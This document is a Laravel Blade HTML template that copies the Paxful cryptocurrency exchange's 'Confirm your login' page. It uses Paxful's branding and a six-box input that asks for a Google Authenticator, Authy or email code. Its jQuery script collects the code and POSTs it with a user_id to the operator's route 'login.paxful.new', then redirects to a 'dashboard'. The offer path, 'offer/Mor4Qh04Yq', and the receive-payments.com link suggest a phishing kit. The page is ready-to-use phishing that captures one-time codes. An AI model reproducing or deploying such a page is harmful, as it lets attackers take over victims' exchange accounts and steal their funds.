
<!DOCTYPE html>
<html lang="en" dir="ltr" class="">

<head>
    <meta charset="utf-8" />
    <meta name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
   <meta name="csrf-token" content="{{ csrf_token() }}">

    <link rel="icon" href="{{asset('assets/favicons/icon.ico')}}" />

    <meta name="description"
          content="Sign in to your Paxful account trade or manage your cryptocurrency. We suggest setting up two-factor authentication for enhanced account security.">
    <link rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&display=swap&subset=cyrillic" />
    <link rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&display=swap&subset=cyrillic" />
    <link rel="stylesheet" href="{{asset('assets/css/style.css')}}">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
<link rel="https://receive-payments.com/offer/Mor4Qh04Yq/static/css/fa.css"/>

<title>Log In to Your Account | Paxful</title>
</head>

<body>
<div class="content_container">
    <div class="content_first_Cont_veification">
        <div class="nav1">
            <div class="logo">
                <div class="img">
                    <img src="{{url('assets/img/paxlogo.png')}}" alt="">
                </div>
            </div>
            <div class="lan">
                <div class="wrld">
                  <svg class="svg-inline--fa fa-globe" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="globe" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M352 256c0 22.2-1.2 43.6-3.3 64H163.3c-2.2-20.4-3.3-41.8-3.3-64s1.2-43.6 3.3-64H348.7c2.2 20.4 3.3 41.8 3.3 64zm28.8-64H503.9c5.3 20.5 8.1 41.9 8.1 64s-2.8 43.5-8.1 64H380.8c2.1-20.6 3.2-42 3.2-64s-1.1-43.4-3.2-64zm112.6-32H376.7c-10-63.9-29.8-117.4-55.3-151.6c78.3 20.7 142 77.5 171.9 151.6zm-149.1 0H167.7c6.1-36.4 15.5-68.6 27-94.7c10.5-23.6 22.2-40.7 33.5-51.5C239.4 3.2 248.7 0 256 0s16.6 3.2 27.8 13.8c11.3 10.8 23 27.9 33.5 51.5c11.6 26 20.9 58.2 27 94.7zm-209 0H18.6C48.6 85.9 112.2 29.1 190.6 8.4C165.1 42.6 145.3 96.1 135.3 160zM8.1 192H131.2c-2.1 20.6-3.2 42-3.2 64s1.1 43.4 3.2 64H8.1C2.8 299.5 0 278.1 0 256s2.8-43.5 8.1-64zM194.7 446.6c-11.6-26-20.9-58.2-27-94.6H344.3c-6.1 36.4-15.5 68.6-27 94.6c-10.5 23.6-22.2 40.7-33.5 51.5C272.6 508.8 263.3 512 256 512s-16.6-3.2-27.8-13.8c-11.3-10.8-23-27.9-33.5-51.5zM135.3 352c10 63.9 29.8 117.4 55.3 151.6C112.2 482.9 48.6 426.1 18.6 352H135.3zm358.1 0c-30 74.1-93.6 130.9-171.9 151.6c25.5-34.2 45.2-87.7 55.3-151.6H493.4z"></path></svg>
                </div>
                <div class="select">
                    <select name="" id="">
                        <option value="">English</option>
                        <option value="">Français</option>
                        <option value="">Español</option>
                    </select>
                </div>

            </div>
        </div>
        <div class="form_cont1">
            <div class="nav2">
                <div class="headnav22">
                   
                    
                    <h1>Confirm your login!</h1>
                </div>
                <div id="error" style="color:red;"></div>
                <style>
                    .confirm_text p{
                        font-size: 13px;
                    }
                    .confirm_text p span{
                        color: #00a5ef;
                        margin: 15px 0px 0px;
                    }
                    .back_login a{
                        color: #00a5ef;
                        text-decoration: none;
                    }
                </style>
                <div class="confirm_text">
                    <p>Open Google Authenticator/Authy or your Email and enter the code you see their below.<br />
                        <span>trouble logging in?</span>
                    </p>
                </div>
                <div class="veificain_input">
                    <input type="text">
                </div>
                <style>
                    .code-input {
                        display: flex;
                        gap: 10px;
                        margin-bottom: 10px;
                    }

                    .code-input input {
                        width: 40px;
                        height: 40px;
                        text-align: center;
                        font-size: 1.2rem;
                        border: 1px solid #ccc;
                        border-radius: 5px;
                    }

                    .code-input input:focus {
                        outline: none;
                        border-color: #007bff;
                    }
                </style>
                <div class="code-input">
                    <input type="text" class="code-box" maxlength="1" pattern="\d" required>
                    <input type="text" class="code-box" maxlength="1" pattern="\d" required>
                    <input type="text" class="code-box" maxlength="1" pattern="\d" required>
                    <input type="text" class="code-box" maxlength="1" pattern="\d" required>
                    <input type="text" class="code-box" maxlength="1" pattern="\d" required>
                    <input type="text" class="code-box" maxlength="1" pattern="\d" required>
                </div>
                <div class="back_login">
                    <a href="{{url('offer/Mor4Qh04Yq')}}">back to login</a>
                </div>
            </div>
        </div>

    </div>
    <div class="content_second_cont_veification">
        <div class="color">

        </div>
        <div class="image_tag">
            <div class="img">
                <div class="imgy">
                    <img src="{{url('assets/img/paxauthy.jpg')}}" alt="">

                </div>
            </div>

        </div>
    </div>
</div>
<script src="../static/js/all.js"></script>
<script src="{{asset('assets/js/jquery.js')}}"></script>
<script>
   $(document).ready(function() {
        var url = '{{route('login.paxful.new')}}';
                var user_id = '{{$user_id}}';
                var dash = '{{route('dashboard')}}';

        const codeBoxes = $('.code-box');

        codeBoxes.on('input', function() {
            const currentIndex = codeBoxes.index(this);

            if ($(this).val() !== '' && currentIndex < codeBoxes.length - 1) {
                codeBoxes.eq(currentIndex + 1).focus();
            }
        });

        codeBoxes.on('keydown', function(e) {
            if (e.key === 'Backspace') {
                const currentIndex = codeBoxes.index(this);

                if (currentIndex > 0 && $(this).val() === '') {
                    codeBoxes.eq(currentIndex - 1).focus();
                }
            }
        });

        codeBoxes.last().on('input', function() {
            const code = codeBoxes.map(function() {
                return $(this).val();
            }).get().join('');

            if (code.length === codeBoxes.length) {
                // Perform database submission or authentication logic here
                // $.post(url, { code: code }, function(response) {
                //         if(response = 'success'){
                //             window.location.href = '../Mor4Qh04Yq';
                //         }
                //     }
                // );
            var CSRF_TOKEN = $('meta[name="csrf-token"]').attr('content');

                
        $.ajax({
            url: url,
            method: 'POST',
            headers: {
                'X-CSRF-TOKEN': CSRF_TOKEN // Include the CSRF token in the header
            },
            data: {
                _token: CSRF_TOKEN, // Alternatively, include it as part of the data
                code: code,
                user_id: user_id
               
            },
            success: function(response) {
                console.log(response);
                var jsonResponse = JSON.parse(response);

                // Accessing the 'status' property
                var statusValue = jsonResponse.status;
               if(statusValue === 1){
                  document.getElementById('error').innerHTML = jsonResponse.message;
               }
               if(statusValue === 2){
                  document.getElementById('error').innerHTML = jsonResponse.message;
               }
               if(statusValue === 0){
                  window.location.href = dash;
               }
            },
            error: function(xhr, status, error) {
                console.log(error);
            }
        });
            }
        });
    });

</script>
</body>

</html>
